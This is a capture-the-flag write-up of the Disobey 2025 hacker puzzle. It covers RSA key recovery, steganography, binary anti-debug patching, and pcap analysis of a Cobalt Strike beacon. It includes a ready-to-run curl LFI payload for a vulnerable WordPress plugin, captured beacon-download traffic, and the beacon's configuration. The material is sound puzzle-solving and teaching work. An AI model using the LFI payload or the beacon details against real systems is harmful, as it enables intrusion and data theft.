# Disobey 2025 puzzle
```Whoever seeks, finds. This year's instructions for the Hacker Puzzle are only for those who can find it.. Is this it?``` <br>
So it begins!<br>
In collaboration with [HOLAZOo](https://www.zolaboo.com)


## Dive into BlueOcean

Puzzle starts from account on X platform: [BlueOcean110](https://x.com/BlueOcean313130).<br>
Although much of the content is in Korean, and the location is shown as a hex value, there doesn't seem to be anything immediately useful or interesting. <br>
Googling the user reveals a GitHub profile with two repositories:
- [path-to-truth](https://github.com/BlueOcean110/path-to-truth)
- [kimchi-burger](https://github.com/BlueOcean110/kimchi-burger)

```kimchi-burger``` seems to have only some recipe there and gives no clue for now so starting with ```path-to-truth``` repo.


## Start point: path-to-truth

The ```path-to-truth``` repository contains four files:
- door:           7-zip archive data, version 0.4
- key:            ASCII text
- keyhole:        data
- lock:           openssl enc'd data with salted password

The filenames themselves hint at the sequence to follow: start with the key, use it on the keyhole, and so on.<br>
The ```key``` file turns out to be a public key: <br>
```bash
-----BEGIN PUBLIC KEY-----
MIIBHzANBgkqhkiG9w0BAQEFAAOCAQwAMIIBBwKBgQDR0QTlRKMu7ZkUyygtphpc
xX16WdwbgwgqgMfJ8Nevn6hBTzIjXjt1x47hmGyNbRJR4uwnkFYe1pgKSWgUcJe3
fHS63Wkg8eOqE31klUFULO8xnwlqGc9X7KDxR+RH1weU56bL9lYBvX679GlzdsEb
LCDhRZ/g2uy8LJHht1bfjwKBgGRsYdkDY7xusaYdhWdJ4VXE+/DxcQDD5ufOpleQ
fN+5Bx8PF+oH+sesPNEEjtTajl0Lx+EZ5gEns1HX5UCqqkjDeuWMLspbGznOlfbU
rKWtxJWaWldF2oaJ1u6fL9XLJl8v5gvmypmneVXvARWDalMSxxehu0JFgWcVpJ4U
d4oZ
-----END PUBLIC KEY----- 
```

Using RsaCtfTool trying to extract the private key from the public key:<br>
```bash
RsaCtfTool --private --publickey key --output key.private
['key']

[*] Testing key key.
attack initialized...
attack initialized...
[*] Performing factordb attack on key.
[*] Attack success with factordb method !

Results for key:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOAIBAAKBgQDR0QTlRKMu7ZkUyygtphpcxX16WdwbgwgqgMfJ8Nevn6hBTzIj
Xjt1x47hmGyNbRJR4uwnkFYe1pgKSWgUcJe3fHS63Wkg8eOqE31klUFULO8xnwlq
Gc9X7KDxR+RH1weU56bL9lYBvX679GlzdsEbLCDhRZ/g2uy8LJHht1bfjwKBgGRs
YdkDY7xusaYdhWdJ4VXE+/DxcQDD5ufOpleQfN+5Bx8PF+oH+sesPNEEjtTajl0L
x+EZ5gEns1HX5UCqqkjDeuWMLspbGznOlfbUrKWtxJWaWldF2oaJ1u6fL9XLJl8v
5gvmypmneVXvARWDalMSxxehu0JFgWcVpJ4Ud4oZAiAYYi0Sl1lv+9Ak7ycqYJLF
UzPkCGB43hhM43a/qSogQQJBAN3heIrMQefqcIfCu47nPFNV68r+6QVPc1O2+bqe
YdS9jOpLuiIaJ4KANPDDqfQsad70+dcw1QWBJtO9UAexCOsCQQDyFKDBg/kfclfz
NAOVbSdv9QV2/5fo3AyFq4HMoiRA46o35NJ0yu7ph3hH2XCsSbpFk3zATZSMe7eB
VbTeLVrtAiAYYi0Sl1lv+9Ak7ycqYJLFUzPkCGB43hhM43a/qSogQQIgGGItEpdZ
b/vQJO8nKmCSxVMz5AhgeN4YTON2v6kqIEECQDkx/vrLN4da9qphlOHyHBpU0c4X
z7s4uAN89aX4W2VS4+ARETNHoZMQvjW7HGt5mKsl7+fJt/RHdQ+hb8RS7xU=
-----END RSA PRIVATE KEY-----

```
The public key is now converted to a private key. With the private key in hand, it's time to try it on the ```keyhole``` file. Using OpenSSL to decrypt:
```bash
openssl rsautl -decrypt -inkey key.private -in keyhole -out keyhole.plain
```

## Unlocking the Lock

Now, for the ```lock``` file, which is OpenSSL encrypted data with a salted password. The commit history reveals an interesting message:<br>

```bash
commit 935b3b2d184ea9e73c8a7e71f00b8d1837ef1f56 (HEAD -> main, origin/main, origin/HEAD)
Author: BlueOcean110 <blueaocean110@kimchi.ninja>
Date:   Sun Sep 1 11:25:05 2024 -0400

    ZWM5OGE0ZWQ4ZTk4ZWI5ZGJjMjBlYzk1OGNlY2I5YjRlY2JmYTQyMTIwZWNiNjk0ZWNiOGExZWQ5NWEwMjBlZDk1ODRlYzlhOTRlYWIwODAyMGVjOTc4NmVjOGFiNWViOGI4OGViOGJhNDJlMjA0MTQ1NTMyZDMyMzUzNjJkNDM0MjQzMjBlYmIwOGYyMDcwNjI2YjY0NjYzMmVhYjA4MDIwZWM5ZWEwZWFiODg4ZWM5NzkwMjBlY2EwODFlZDk1YTllZDk1YTllYjhiODhlYjhiYTQyZQ==
```
Clearly base64 encoded comment but it will decode as hexes, decoding it with oneliner using ```base64``` & ```xxd``` results gives a hint in Korean: <br>
```
오페라 알카쿤! 추측할 필요가 없습니다. AES-256-CBC 및 pbkdf2가 잠금에 적합합니다. 
```
Translated, it means: 
```
Opera Alcacoon! No need to guess. AES-256-CBC and pbkdf2 are suitable for locking.```<br>
Great! So it ```lock``` file might be encrypted with AES-256-CBC and pbkdf2. 
```

Using OpenSSL to decrypt the file with the ```keyhole``` as the password:
```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in lock -out lock.decrypted -pass file:"./keyhole.plain"

```

So ```keyhole.plain``` gives password for the ```door``` zip file:

```
Operation 김치 마카로니 2025
***************************

Kouvoston Makkara has been poisoning Kouvostoliitto's citizens with microplastics for years. Herkku 김치 aims to improve world's health situation one toxic actor at a time. We want to penetrate the systems of the Kouvoston Makkara to confirm our hypothesis of sausage poisoning.

Our job is simple but requires skills in the following categories: steganography, reverse, web, pcap analysis, crypto, and pwn. Are you up for the challenge?

First, solve the challenges we published in this same repo. Then hack into the site that the challenges will give you access to. One challenge has URL of the target site, and the other has credentials. When you get access to the site, try to find evidence related to Kouvoston Makkara's recent ransomware incident. Analyze the data, and you will find information about vulnerabilities in the systems of the Kouvoston Makkara. Exploit the vulnerability to gain access.

You've now found the key, put it to keyhole, opened the lock, and you're ready to open the door. Password for the door file: Disobey25-6cd9-4fbf-1337-36fd9db7a835

[OFF GAME]

This year we want a pleasant hacker puzzle experience for everyone (or well, as much as possible ^_*). If you suspect that any part is not working correctly / at all, please contact hackerpuzzle@disobey.fi (no hints!)

Please note that the last step provides a unique purchase link, which is updated once the ticket has been purchased. There may be a delay of a few minutes before the ticket is updated.

Truly yours,
Puzzle Team 2025

[/OFF GAME] 
```

## Stegano & Reverse

Extracting the ```door``` file, we find two files within:
- crackme:     ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=940395f8c688055c666fdc5cdd21ef5a8ed24a5d, for GNU/Linux 3.2.0, stripped
- stegano.png: PNG image data, 506 x 782, 8-bit/color RGB, non-interlaced

 ### Stegano

The first file we investigate is the .png file named stegano, so naturally, we expect steganography to be involved.

Basic start, master of all commands: `strings`, but as usual, this fails me so often, nothing useful here.

Played around with gimp also to see if something is hidden but nothing.<br>
Using some tools against this, still no luck until visited on github page again to see that there was another repo: [kimchi-burger](https://github.com/BlueOcean110/kimchi-burger)

It's mostly in Korean, and while it seemed to just contain a recipe, one commit caught my eye:<br>
![commit Go](./pix/commitGo.png)

This small change from `go` to `Go` hinted at the `Go` programming language. So, I turned to tools specifically written in Go for steganography.<br>

Found this tool `stegify`, a steganography tool written in `Go` but also, `kimchi-burger` recipe got this: `Learn Smart Basics` (`LSB`) at same line as `Go`. This `stegify` tool happens to use `LSB`. So I ran the following command: `stegify decode --carrier stegano.png  --result stegano.result` and so we got new `.png` file:<br>
![stegano result](./pix/result.png)<br>

The image contains the clear text: `Where_does_this_fit?` — but the question remains, where does it fit?<br>

Maybe stegano has something more.

Running `binwalk` against this and this actually sees something:
```bash
$ binwalk stegano.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 506 x 782, 8-bit/color RGB, non-interlaced
41            0x29            Zlib compressed data, default compression
479566        0x7514E         7-zip archive data, version 0.4
```

We found a 7-zip archive embedded in the image. Time to extract it.

Using `binwalk` but with `-e` flag to extract those files:<br>
```bash
$ binwalk -e stegano.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 506 x 782, 8-bit/color RGB, non-interlaced
41            0x29            Zlib compressed data, default compression
479566        0x7514E         7-zip archive data, version 0.4

$ cd _stegano.png.extracted

$ ls
29  29.zlib

$ file 29.zlib
29.zlib: zlib compressed data
```

The `29.zlib` file is a compressed archive, so I attempted to extract it using 7-Zip. When prompted for a password, I tried `Where_does_this_fit?`, and it worked!

```bash

$ 7z x 29.zlib

7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 481903 bytes (471 KiB)

Extracting archive: 29.zlib
--
Path = 29.zlib
Type = 7z
Offset = 479525
Physical Size = 2378
Headers Size = 138
Method = LZMA2:48k 7zAES
Solid = -
Blocks = 1


Enter password (will not be echoed):
Everything is Ok

Size:       37686
Compressed: 481903


$ ls
29  29.zlib  image.bmp

```

After extraction, I found yet another image, `image.bmp`:<br>
![image.bmp](./pix/image.bmp)<br>

Initially, the image didn’t reveal anything significant, but using `zsteg` (with the -a flag), there was something interesting:
```
<snippet>..............................
b6p,bgr,msb,xy      .. text: "\tr(wqHuO"
b8,r,lsb,xy         .. text: "msea0075I"
b8,g,lsb,xy         .. text: "ea.v003#F"
b8,b,lsb,xy         .. text: "sgw#030RF"
b8,rgb,lsb,xy       .. text: "message.wav#0000037305#RIFF"
b8,bgr,lsb,xy       .. text: "semgasw.e#va000300037R#5FFI"
b1,bgr,msb,xy,prime .. text: "i%>^qX!^"
b2,g,msb,xy,prime   .. file: OpenPGP Secret Key
b2,b,msb,xy,prime   .. file: CLIPPER COFF executable - version 24940
b3,g,msb,xy,prime   .. text: "pm<\rFNc@"
b5p,r,msb,xy,prime  .. file: OpenPGP Secret Key
...............................................
```
It seems there's a `.wav` file hidden inside the image. Using `zsteg` to extracted the audio:<br>
```
zsteg -E b8,rgb,lsb,xy image.bmp > hidden.wav
```

Playing this doesn't give much, but opening with `audacity` to check if there is something useful. Changing view to spectrogram and tuning some settings, there is something, but as it is not quite useful:
![hidden.wav](./pix/audacity.png)<br>

This could be hidden text here like in morse code or binary. Taking this "message", that every "upper" line beats is `1` and lower line beats `0` we get:<br>
`100000011111000000010011111010011110011110010001111010111110100111101011001100011101000000100010011100011`
<br>
And we also take another, but now "upper" is `0` and lower is `1`:
`011111100000111111101100000101100001100001101110000101000001011000010100110011100010111111011101100011100`

This wasn't `morse code` but pretty close: baudot. Using handy online decoder site `dcode.fr` which gave some results when upper was `0` and lower `1`:
![kouvostoforen](./pix/dcode.png)

Very first line: `KOUVOSTOFORENSICSCOM` got my eye, so next to try url: `kouvostoforensics.com`
![kouvostoforensics.com](./pix/kouvostofore.png)<br>

And so we got address to the `kouvostoforensics.com` which also need credentials.



 ### Reversing crackme
 Second file was this binary named `crackme`.

 Checking what file we actually are looking for with `file` command:<br>
 ```bash
 crackme: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=940395f8c688055c666fdc5cdd21ef5a8ed24a5d, for GNU/Linux 3.2.0, stripped
```

Using the ```strings``` command on the ```crackme``` binary didn't reveal anything useful, so I proceeded by executing it. However, the program seems to hang. Running ```strace -i ./crackme``` revealed a UDP socket bound to ```127.0.0.1:21863```:

 ```bash
 [0000000000441c4c] read(4, "Name:\tcrackme\nUmask:\t0002\nState:"..., 4095) = 1560
[0000000000441a2a] close(4)             = 0
[00000000004430d7] socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
[0000000000442fe7] bind(5, {sa_family=AF_INET, sin_port=htons(21863), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
[000000000044307a] recvfrom(5,
``` 

To communicate with the socket, I used ```netcat```:

```bash
[000000000044307a] recvfrom(5, "Test\n", 64, 0, {sa_family=AF_INET, sin_port=htons(58401), sin_addr=inet_addr("127.0.0.1")}, [16]) = 5
[0000000000441a2a] close(5)             = 0
[00000000004426d2] mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f185f600000
[0000000000442767] mprotect(0x7f185f601000, 8388608, PROT_READ|PROT_WRITE) = 0
[000000000043057e] rt_sigprocmask(SIG_BLOCK, ~[], [], 8) = 0
[0000000000442a59] clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7f185fe00990, parent_tid=0x7f185fe00990, exit_signal=0, stack=0x7f185f600000, stack_size=0x800300, tls=0x7f185fe006c0} => {parent_tid=[4121971]}, 88) = 4121971
strace: Detached unknown pid 4121971
[00000000004305e8] rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>) = ?
[????????????????] +++ killed by SIGSEGV +++
zsh: segmentation fault  strace -i ./crackme
```

However, this led to a segmentation fault. After adding the ```-f (follow fork)``` argument to ```strace```, I obtained more useful output:
```bash
[pid 4122682] [000000000044307a] <... recvfrom resumed>"Test\n", 64, 0, {sa_family=AF_INET, sin_port=htons(47142), sin_addr=inet_addr("127.0.0.1")}, [16]) = 5
[pid 4122682] [0000000000441a2a] close(4) = 0
[pid 4122682] [00000000004426d2] mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fe92f000000
[pid 4122682] [0000000000442767] mprotect(0x7fe92f001000, 8388608, PROT_READ|PROT_WRITE) = 0
[pid 4122682] [000000000043057e] rt_sigprocmask(SIG_BLOCK, ~[], [], 8) = 0
[pid 4122682] [0000000000442a59] clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7fe92f800990, parent_tid=0x7fe92f800990, exit_signal=0, stack=0x7fe92f000000, stack_size=0x800300, tls=0x7fe92f8006c0}strace: Process 4122711 attached
 => {parent_tid=[4122711]}, 88) = 4122711
[pid 4122711] [000000000042ff18] rseq(0x7fe92f800fe0, 0x20, 0, 0x53053053 <unfinished ...>
[pid 4122682] [00000000004305e8] rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
[pid 4122711] [000000000042ff18] <... rseq resumed>) = 0
[pid 4122682] [00000000004305e8] <... rt_sigprocmask resumed>NULL, 8) = 0
[pid 4122711] [000000000042fcec] set_robust_list(0x7fe92f8009a0, 24 <unfinished ...>
[pid 4122682] [000000000048af75] clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=2, tv_nsec=0},  <unfinished ...>
[pid 4122711] [000000000042fcec] <... set_robust_list resumed>) = 0
[pid 4122711] [000000000042fd4e] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[pid 4122711] [000000000044281a] ptrace(PTRACE_TRACEME) = -1 EPERM (Operation not permitted)
[pid 4122711] [000000000040118b] rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
[pid 4122711] [0000000000464c07] gettid() = 4122711
[pid 4122711] [00000000004774d7] getpid() = 4122682
[pid 4122711] [0000000000464c1c] tgkill(4122682, 4122711, SIGABRT) = 0
[pid 4122711] [0000000000464c1c] --- SIGABRT {si_signo=SIGABRT, si_code=SI_TKILL, si_pid=4122682, si_uid=1000} ---
[pid 4122682] [000000000048af75] <... clock_nanosleep resumed> <unfinished ...>) = ?
[pid 4122684] [000000000048af75] <... clock_nanosleep resumed> <unfinished ...>) = ?
[pid 4122711] [????????????????] +++ killed by SIGABRT +++
[pid 4122684] [????????????????] +++ killed by SIGABRT +++
[????????????????] +++ killed by SIGABRT +++
```


It became clear that the program checks whether it’s being traced using the ptrace system call:
```
[pid 4122711] [000000000044281a] ptrace(PTRACE_TRACEME) = -1 EPERM (Operation not permitted)
```
This system call is used by many debugging tools like strace and gdb. Since only one process can be traced by time by `ptrace`, the program throws an error when it tries to execute it.

#### Debugging the Binary
Investigating the binary with Ghidra and gdb, I confirmed that the ptrace syscall (`0x65`) is used to detect tracing:

![ptrace syscall in asm](./pix/syscall_ptrace.png)<br>
At address `0x00442813`, the value `0x65` is stored in the `EAX` register, which calls the ptrace syscall. If the program detects error eg. cannot execute this since someone already using `ptrace` on this or that it is being traced, it won't proceed.

But this wasn’t the only problem. While running the program in gdb, it crashed again while trying to access an invalid memory address: 
![crash](./pix/crash.png)<br>

There seems to be call to ```Name:\tcr```, this doesn't seem right at all.. But little backtracking and there was ```syscall``` to `/proc/self/status` file where this line (`Name: crackme`) exists along with other many information about the process, like if someone is tracing.
Setting breakpoint to this syscall at `0x441ba6` but this one was only syscall `dup` (`0x101`).

Carry on step by step and finaly located read syscall:<br>
```
0x441c4a    syscall  <SYS_read>
        fd: 4 (/proc/1409671/status)
        buf: 0x7fffffffcc00 ◂— 0
        nbytes: 0xfff
```

During GDB execution by manually changing this `syscall` to NOP's  to test if binary makes it to the end without crashing:
![execuiton success](./pix/execution_success.png)

And so it seems.

So, it’s time to patch the binary!

#### Patching with Radare2

To patch the binary and avoid tracing detection, open the binary in Radare2: ```r2 -w crackme```.<br>

Navigate to the address of the `ptrace` syscall:
```r
[0x004123b4]> s 0x00442813
[0x00442813]> pd 5
            0x00442813      b865000000     mov eax, 0x65
            0x00442818      0f05           syscall
            0x0044281a      483d00f0ffff   cmp rax, 0xfffffffffffff000
        ┌─< 0x00442820      773e           ja 0x442860
        │   0x00442822      4885c0         test rax, rax
```

Then, patch the `mov` and `syscall` instructions:
```r
[0x00442813]> wx b8030000009090
[0x00442813]> pd 5
            0x00442813      b803000000     mov eax, 3
            0x00442818      90             nop
            0x00442819      90             nop
            0x0044281a      483d00f0ffff   cmp rax, 0xfffffffffffff000
        ┌─< 0x00442820      773e           ja 0x442860
```
This `wx b8030000009090` replaces the `mov` and `syscall` instructions, making the program ignore tracing.

And now other one, we can try to do same thing.<br>
Again using ```s 0x441c4a``` to go on this address, with ```pd 5``` we can print next 5 lines from current address and ```wx 9090``` we can write NOP sled on syscall:
```r
$ r2 -w crackme
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00401790]> s 0x441c4a
[0x00441c4a]> pd 5
            0x00441c4a      0f05           syscall
            0x00441c4c      483d00f0ffff   cmp rax, 0xfffffffffffff000
        ┌─< 0x00441c52      7734           ja 0x441c88
        │   0x00441c54      4489c7         mov edi, r8d
        │   0x00441c57      4889442408     mov qword [rsp + 8], rax
[0x00441c4a]> wx 9090
```

Now program seems to work as it should (kind of) and we may start proper debugging.<br>
 I traced the execution using gdb and found an `XOR` operation at `0x42623d`, where it processes data sent through `netcat`. The first letter (T in "Test") is XOR'd with a value `0x00`:

![XOR netcat data](./pix/XOR_func.png)<br>

Let's break it down:
```r
   0x42623d    xor    eax, dword ptr [rbp - 0x14]     EAX => 84 (0x54 ^ 0x0)                                           # XOR first letter of data with 0x00
   0x426240    mov    edx, eax                        EDX => 0x54                                                   # Move XOR'd letter to EDX
   0x426242    mov    eax, dword ptr [rbp - 0x18]     EAX, [0x7ffff6a00238] => 2                                    # Move value from RBP-0x18 to EAX
   0x426245    movsxd rcx, eax                        RCX => 2                                                      # More moving...
   0x426248    mov    rax, qword ptr [rbp - 0x50]     RAX, [0x7ffff6a00200] => 0x426128 ◂— cld                      #
   0x42624c    add    rax, rcx                        RAX => 0x42612a (0x426128 + 0x2)                              #
   0x42624f    movzx  eax, byte ptr [rax]             EAX, [0x42612a] => 0x79                                       #
   0x426252    movzx  eax, al                         EAX => 0x79                                                   #
   0x426255    cmp    edx, eax                        0x54 - 0x79     EFLAGS => 0x297 [ CF PF AF zf SF IF df of ]   # First compare also our Letter. 
   0x426257    je     0x426260                    <0x426260>
```

So, what is it compared against?<br>
```$ python
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x79)
'y'
>>>
```
Okey, what if we send `yTest` instead `Test` ```netcat```?<br>
Let's set breakpoint on this `0x42623d` and run it again:
```r
 ► 0x42623d    xor    eax, dword ptr [rbp - 0x14]     EAX => 121 (0x79 ^ 0x0)
   0x426240    mov    edx, eax                        EDX => 0x79
   0x426242    mov    eax, dword ptr [rbp - 0x18]     EAX, [0x7ffff6a00238] => 2
   0x426245    movsxd rcx, eax                        RCX => 2
   0x426248    mov    rax, qword ptr [rbp - 0x50]     RAX, [0x7ffff6a00200] => 0x426128 ◂— cld
   0x42624c    add    rax, rcx                        RAX => 0x42612a (0x426128 + 0x2)
   0x42624f    movzx  eax, byte ptr [rax]             EAX, [0x42612a] => 0x79
   0x426252    movzx  eax, al                         EAX => 0x79
   0x426255    cmp    edx, eax                        0x79 - 0x79     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x426257  ✔ je     0x426260                    <0x426260>
    ↓
   0x426260    add    dword ptr [rbp - 0x14], 1     [0x7ffff6a0023c] => 1 (0 + 1)
```

Now `cmp` is equal and jump (JE) will be done. Will this now make second round to XOR again?<br>

```r
► 0x42623d    xor    eax, dword ptr [rbp - 0x14]     EAX => 85 (0x54 ^ 0x1)
   0x426240    mov    edx, eax                        EDX => 0x55
   0x426242    mov    eax, dword ptr [rbp - 0x18]     EAX, [0x7ffff6a00238] => 6
   0x426245    movsxd rcx, eax                        RCX => 6
   0x426248    mov    rax, qword ptr [rbp - 0x50]     RAX, [0x7ffff6a00200] => 0x426128 ◂— cld
   0x42624c    add    rax, rcx                        RAX => 0x42612e (0x426128 + 0x6)
   0x42624f    movzx  eax, byte ptr [rax]             EAX, [0x42612e] => 0x60
   0x426252    movzx  eax, al                         EAX => 0x60
   0x426255    cmp    edx, eax                        0x55 - 0x60     EFLAGS => 0x287 [ CF PF af zf SF IF df of ]
   0x426257    je     0x426260                    <0x426260>

   0x426259    mov    eax, 0                  EAX => 0
```
Yes it indeed does! But now again, from data `yTest` next character is `0x54 (T)` so `cmp` is not equal.
Also XOR value is not `0x00` but `0x01`. So this might be loop where this XOR value is somewhat loop counter. <br>
At `rbp - 0x14` seems to be holding this value which is used to `XOR` our characters and at `0x426260` there is `add` instruction which is adding +1 more to this `XOR` instruction. Also at `0x426268` there is `0x2f` value where this is compared to. So by this we can assume that string must be `0x2f` (47, including 0x00 its 48) long. 
```r
   0x426257  ✔ je     0x426260                    <0x426260>
    ↓
   0x426260    add    dword ptr [rbp - 0x14], 1        [0x7ffff6a0023c] => 1 (0 + 1)
   0x426264    add    dword ptr [rbp - 0x18], 4        [0x7ffff6a00238] => 6 (2 + 4)
   0x426268    cmp    dword ptr [rbp - 0x14], 0x2f     0x1 - 0x2f     EFLAGS => 0x297 [ CF PF AF zf SF IF df of ]
   0x42626c  ✔ jle    0x42620f                    <0x42620f>
```

At this point, some string can be "decoded" by adding this "new" character to data which is sent via `netcat`. <br>
First we check current `XOR` value from address `0x42623d` and next information we need is the actual character, this we can get at address where `cmp` instruction is called `0x426255`. The `EDX` value is our xorred character and `EAX` is what it "should" be.
This took some time, but afterall we managed to decode some string: `yassin:BlueOcean11_c0mes_up_w1th_the_b3st_Kimchi` and this seems to be credentials!


## Kouvosto forensics site
Now we have url and credentials for it, so let's dig in.

Navigating to url it ask for username and password. Using just found credentials from `crackme` (`yassin:BlueOcean11_c0mes_up_w1th_the_b3st_Kimchi`) we get access to the page:<br>

![Kouvosto page](./pix/kouvostopage.png)

Investigating page, it is WP (WordPress) page so let's check what plugins it got.
Navigating to the [plugins](https://kouvostoforensics.com/wp-content/plugins/) there seems to be 2 different plugins:<br>
![wpplugins](./pix/wpplugins.png)

Plugin `web-directory-free` seems to be `Stable tag: 1.7.1` and there is atleast one vulnerability, `CVE-2024-3673` which is unauthenticated LFI (Local File Inclusion).

So, testing if this is the case:<br>
![LFI exploit](./pix/LFI_exploit.png)<br>
This indeed seems to work. So now we have possible exploit at our hands.

Digging into source codes of pages, in [cases](view-source:https://kouvostoforensics.com/cases/) source code, there was one interesting line: `<!-- wp:include "/var/www/incident_data.pcapng" -->`. 
With this and LFI exploit we can try to check if this file can be loaded from server.

When using this LFI exploit, it comes in object, but using curl and piping it trough jq, we should manage to get only data itself from file. But, also it seems to be base64, so to get it all right, pipe it trough base64:
```bash
$ curl -X POST https://kouvostoforensics.com/wp-admin/admin-ajax.php -d "from_set_ajax=1&action=w2dc_controller_request&template=../../../../../var/www/incident_data.pcapng" -H "Authorization: Basic eWFzc2luOkJsdWVPY2VhbjExX2MwbWVzX3VwX3cxdGhfdGhlX2Izc3RfS2ltY2hp" | jq -r '.html' | base64 -d > incident.pcapng
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 65.8M    0 65.8M  100    99  7241k     10  0:00:09  0:00:09 --:--:--  9.7M


$ ls
incident.pcapng


$ file incident.pcapng
incident.pcapng: pcapng capture file - version 1.0
```

## pcap analysis

Time to open pcapng file with wireshark and start analysing network traffic.

Lots of memes, "duuniexpo" stuff but also weird address used to get couple weird files,

`DHnc`:
```
GET /DHnc HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)
Host: 100.64.13.37
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Sat, 31 Aug 2024 13:17:13 GMT
Content-Type: application/octet-stream
Content-Length: 262727

.H....3].E.H....M.1.H...U.U.1..U.1.H......1.9.t...X.H.........."`f-"bb-o:'.:r..r.B.r.B....
.....YaG+.`G..!.$`..Ld..L>. ... ... ... M.. C...Cj..b.........................................................e.......e..........u.../y.{........:..$Iq.<.......D:...Ir......1....]..1..m.\.....}k..*0....X.M.(.}k../.....K...K...K.N.K.*tN..:p..:p..:p.#:Rl(8Yl(.[l(.Yl(.Yl.VXl.FXl.FX..FX..VX..TX..TZ..TZ..TX..TX...\...\...\...<...,...,...,...,...<...<...<...<...<...<...?...?...<...<...<...<...8..,8..,8..,8...<...<...<...<...<...<...<...<...<...<.ip?..p?..p?..p?...=.!.=.!.=.!.=.!.=.!.=.!.=.!.=...X.{.X..iZ..yZ...X...X...X...X...X...X...<...<.A:<.A.>.A.>.A.<.A.<.A.<.A.<...<./.].N.].&.].&.^.&.^.&J].&J].&J].&J].fJ]`H:9.<[9.L{9.L.=.L.=.L)>.L)>.L)>.L)>..)>A"[[-M8[-%7[-%._-%._-%.\-%.\-%.\-%.\-e.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\oe.\o
```
And `svchost.exe`.

After victim has downloaded `DHnc` file, pcap traffic reveals DNS results for `divanodivino.xyz` and it seems that there goes lots of traffic afterwards.

Time to export this `DHnc` object and check what this is.

### DHnc - Cobalt Strike Beacon
Investigating this file but `file` and `strings` command doesn't show anything useful. Despite that, this file seems suspicious, so I uploaded it to VirusTotal for analysis. It appears this file is a Cobalt Strike beacon.
![VirusTotal result](./pix/VT_cobalt.png)

We can investigate this with couple tools by [Didier Stevens](https://blog.didierstevens.com/programs/cobalt-strike-tools/)

We can perform some analysis on this with `1768.py` to get beacons configuration:
```bash
python 1768.py -V ../../DHnc
```
Output:
```bash
File: ../../DHnc
xorkey(chain): 0x666022ff
length: 0x040200d2
xorkey b'.' 2e
0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
0x0002 port                             0x0001 0x0002 80
0x0003 sleeptime                        0x0002 0x0004 60000
0x0004 maxgetsize                       0x0002 0x0004 1048576
0x0005 jitter                           0x0001 0x0002 0
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100a738cde75f1fbb1c18646c377e03016b162b12ba72bdf7dc36b4cd2e4e9bae12205a95c26170bf908105ad7fa4bbccfa798632261bed9870f975f20794e1fe499523d71f08a56cae0315bfde3d6c8a16386b03b7a6551aa1336d50325a3500db27d78ad8fd13b6a73b9fb7c3fb4d7a088e323f07618656ecd83595fa5f823613020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 Has known private key 